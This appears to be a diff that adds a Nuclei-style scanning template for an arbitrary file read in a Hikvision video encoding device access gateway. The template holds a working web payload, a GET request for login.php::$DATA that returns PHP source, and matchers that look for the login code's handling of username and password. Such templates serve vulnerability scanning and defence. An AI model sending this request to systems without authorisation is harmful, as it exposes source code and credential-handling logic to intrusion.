@@ -1,0 +1,30 @@
+id: hikvision-gateway-data-file-read
+
+info:
+  name: HIKVISION 视频编码设备接入网关 $DATA 任意文件读取
+  author: SleepingBag945
+  severity: high
+  description: |
+    HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码
+    title="视频编码设备接入网关"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20$DATA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.html
+
+http:
+  - raw:
+      - |
+        GET /data/login.php::$DATA HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'DataBaseQuery();'
+          - $_POST['userName'];
+          - $_POST['password'];
+        part: body
+        condition: and
